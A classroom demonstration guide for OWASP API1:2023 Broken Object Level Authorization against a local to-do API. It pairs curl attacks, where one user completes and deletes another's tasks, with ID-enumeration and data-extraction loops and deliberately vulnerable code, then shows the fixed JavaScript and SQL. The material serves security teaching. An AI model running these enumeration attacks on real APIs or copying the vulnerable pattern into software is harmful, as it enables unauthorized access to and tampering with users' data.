# 🚨 OWASP API1:2023 - Broken Object Level Authorization (BOLA) 
## Vulnerability Demonstration Guide

> **Presenter:** Fernando  
> **Topic:** API Security - BOLA Vulnerability & Mitigation  
> **Audience:** Class Presentation  

---

## 🎯 **Demo Overview**

This demonstration shows:
1. **Vulnerable Version** - How BOLA attacks work in practice
2. **Secure Version** - How proper authorization prevents the attack
3. **Real-world Impact** - Why this vulnerability is critical

---

## 📋 **Prerequisites & Setup**

### Before Starting Demo:
```bash
# Ensure Docker is running
sudo docker compose down
sudo docker compose up -d

# Verify services are running
sudo docker compose ps
```

### Demo Environment:
- **API Base URL:** `http://localhost:3000`
- **Database:** SQL Server (ToDoDB)
- **Tools:** curl, Docker, Git
- **Two Branches:** `main` (secure) vs `demo-vulnerable-bola` (vulnerable)

---

## 🔴 **PART 1: VULNERABILITY DEMONSTRATION**

### Step 1: Switch to Vulnerable Branch
```bash
git checkout demo-vulnerable-bola
```

### Step 2: Deploy Vulnerable Version
```bash
# Install vulnerable stored procedures
sudo docker cp database-scripts/SP_Completar_Tarea_Vulnerable.sql todo-sqlserver:/tmp/
sudo docker cp database-scripts/SP_Borrar_Tarea_Vulnerable.sql todo-sqlserver:/tmp/

sudo docker exec -it todo-sqlserver /opt/mssql-tools18/bin/sqlcmd -C -S localhost -U sa -P 'TodoApp2024!' -i /tmp/SP_Completar_Tarea_Vulnerable.sql

sudo docker exec -it todo-sqlserver /opt/mssql-tools18/bin/sqlcmd -C -S localhost -U sa -P 'TodoApp2024!' -i /tmp/SP_Borrar_Tarea_Vulnerable.sql

# Restart API with vulnerable code
sudo docker compose restart api
```

### Step 3: Create Test Users & Tasks

#### Create User 1 (Alice):
```bash
curl -X POST http://localhost:3000/api/usuarios \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "Alice",
    "email": "alice@demo.com",
    "password": "Password123!"
  }'
```

#### Create User 2 (Bob):
```bash
curl -X POST http://localhost:3000/api/usuarios \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "Bob", 
    "email": "bob@demo.com",
    "password": "Password123!"
  }'
```

#### Login as Alice:
```bash
ALICE_TOKEN=$(curl -X POST http://localhost:3000/api/usuarios/login \
  -H "Content-Type: application/json" \
  -d '{"email": "alice@demo.com", "password": "Password123!"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

echo "Alice's Token: $ALICE_TOKEN"
```

#### Login as Bob:
```bash
BOB_TOKEN=$(curl -X POST http://localhost:3000/api/usuarios/login \
  -H "Content-Type: application/json" \
  -d '{"email": "bob@demo.com", "password": "Password123!"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

echo "Bob's Token: $BOB_TOKEN"
```

### Step 4: Create Tasks for Each User

#### Alice creates her task:
```bash
curl -X POST http://localhost:3000/api/tareas \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -d '{
    "titulo": "Alice: Complete Project Report",
    "descripcion": "Finish the quarterly project analysis report"
  }'
```

#### Bob creates his task:
```bash
curl -X POST http://localhost:3000/api/tareas \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "titulo": "Bob: Review Security Policies", 
    "descripcion": "Review and update company security policies"
  }'
```

### Step 5: View Tasks to Get IDs

#### Alice views her tasks:
```bash
curl -X GET http://localhost:3000/api/tareas \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  | jq '.'
```

#### Bob views his tasks:
```bash
curl -X GET http://localhost:3000/api/tareas \
  -H "Authorization: Bearer $BOB_TOKEN" \
  | jq '.'
```

> **📝 Note the task IDs!** You'll need them for the attack.

### Step 6: 🚨 DEMONSTRATE THE BOLA ATTACK!

#### Attack Scenario: Bob tries to complete Alice's task

```bash
# Bob attempts to complete Alice's task (Task ID 1)
curl -X PUT http://localhost:3000/api/tareas/1/completar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "HACKED! Bob completed Alice'\''s task - BOLA vulnerability!"
  }'
```

**⚠️ Expected Result (Vulnerable):** `{"mensaje":"Tarea completada exitosamente"}`

#### Attack Scenario: Bob tries to delete Alice's task

```bash
# Bob attempts to delete Alice's remaining task (Task ID X)
curl -X DELETE http://localhost:3000/api/tareas/2/borrar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "HACKED! Bob deleted Alice'\''s task - BOLA vulnerability!"
  }'
```

**⚠️ Expected Result (Vulnerable):** `{"mensaje":"Tarea borrada exitosamente"}`

### Step 7: Verify the Attack Worked

```bash
# Alice checks her tasks - they should be modified by Bob!
curl -X GET "http://localhost:3000/api/tareas?filter=all_including_deleted" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  | jq '.'
```

**🎯 Demo Point:** Alice's tasks were modified by Bob! This is the BOLA vulnerability in action.

---

## 🟢 **PART 2: SECURE IMPLEMENTATION**

### Step 8: Switch to Secure Branch
```bash
git checkout main
```

### Step 9: Deploy Secure Version
```bash
# Restart API with secure code
sudo docker compose restart api

# The secure stored procedures are already deployed
```

### Step 10: Test with Same Attack (Should Fail)

#### Try the same attack - Bob completing Alice's task:
```bash
curl -X PUT http://localhost:3000/api/tareas/1/completar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "This attack should fail now!"
  }'
```

**✅ Expected Result (Secure):** `{"error":"Tarea no encontrada o no pertenece al usuario"}`

#### Try deletion attack:
```bash
curl -X DELETE http://localhost:3000/api/tareas/2/borrar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "This attack should also fail!"
  }'
```

**✅ Expected Result (Secure):** `{"error":"Tarea no encontrada o no pertenece al usuario"}`

---

## 📊 **KEY TALKING POINTS FOR CLASS**

### What is BOLA?
- **Definition:** When APIs fail to validate that users can only access their own resources
- **OWASP Ranking:** #1 API Security Risk in 2023
- **Alternative Names:** IDOR (Insecure Direct Object Reference)

### The Vulnerability in Code

#### **Vulnerable Code:**
```javascript
// ❌ VULNERABLE: No user validation
const { id } = req.params;
// Missing: const { usuario } = req;

await pool.request()
    .input("tareaId", sql.INT, parseInt(id))
    // Missing: .input("usuarioId", sql.INT, usuario.id)
    .execute("SP_Completar_Tarea_Vulnerable");
```

#### **Secure Code:**
```javascript
// ✅ SECURE: Proper user validation
const { id } = req.params;
const { usuario } = req;        // Extract authenticated user

await pool.request()
    .input("tareaId", sql.INT, parseInt(id))
    .input("usuarioId", sql.INT, usuario.id)  // Validate ownership
    .execute("SP_Completar_Tarea");
```

### Database Level Protection

#### **Vulnerable SQL:**
```sql
-- ❌ VULNERABLE: No ownership check
UPDATE Gestion.Tarea 
SET completada = 1
WHERE id = @tareaId;  -- Any user can modify any task!
```

#### **Secure SQL:**
```sql
-- ✅ SECURE: Ownership validation
UPDATE Gestion.Tarea 
SET completada = 1
WHERE id = @tareaId 
AND usuarioId = @usuarioId;  -- Only owner can modify
```

### Real-World Impact
- **Data Breaches:** Users accessing sensitive information of others
- **Data Manipulation:** Unauthorized modification of resources
- **Privacy Violations:** Exposure of personal data
- **Business Logic Bypass:** Circumventing application workflows

---

## 🔧 **BOLA PREVENTION STRATEGIES**

### 1. **Implement Proper Authorization**
- Always validate resource ownership
- Use authenticated user context in every request
- Never trust client-provided resource identifiers

### 2. **Database-Level Security**
- Include user/owner validation in all queries
- Use parameterized stored procedures
- Implement row-level security where possible

### 3. **Defense in Depth**
```
🛡️ Layer 1: Authentication (Who are you?)
🛡️ Layer 2: Authorization (What can you access?)  
🛡️ Layer 3: Resource Validation (Do you own this?)
🛡️ Layer 4: Database Constraints (Enforce at DB level)
```

### 4. **Testing & Validation**
- Test with multiple user accounts
- Automated security scanning
- Manual penetration testing
- Code reviews focusing on authorization

---

## 🎓 **DEMO CLEANUP**

```bash
# Return to main branch
git checkout main

# Reset demo data if needed
sudo docker compose down
sudo docker compose up -d

echo "Demo completed successfully!"
```

---

## 💡 **ADDITIONAL ATTACK SCENARIOS** (Bonus Content)

### ID Enumeration Attack:
```bash
# Attacker tries sequential IDs
for i in {1..10}; do
  curl -X PUT http://localhost:3000/api/tareas/$i/completar \
    -H "Authorization: Bearer $BOB_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"comentario":"Enumeration attack"}' 2>/dev/null | grep "exitosamente" && echo "Task $i vulnerable"
done
```

### Mass Data Extraction:
```bash
# If GET endpoints were also vulnerable (not in this demo)
for i in {1..100}; do
  curl -X GET http://localhost:3000/api/tareas/$i \
    -H "Authorization: Bearer $BOB_TOKEN" 2>/dev/null | jq '.titulo' 2>/dev/null
done
```

---

## ✅ **DEMO CHECKLIST**

- [ ] Vulnerable branch deployed
- [ ] Test users created (Alice & Bob)
- [ ] Tasks created for both users
- [ ] BOLA attack demonstrated successfully
- [ ] Switched to secure branch
- [ ] Attack blocked in secure version
- [ ] Explained technical details
- [ ] Discussed prevention strategies
- [ ] Answered audience questions

---

**🎯 Key Message:** BOLA is the #1 API security vulnerability, but it's completely preventable with proper authorization checks at every layer of your application.
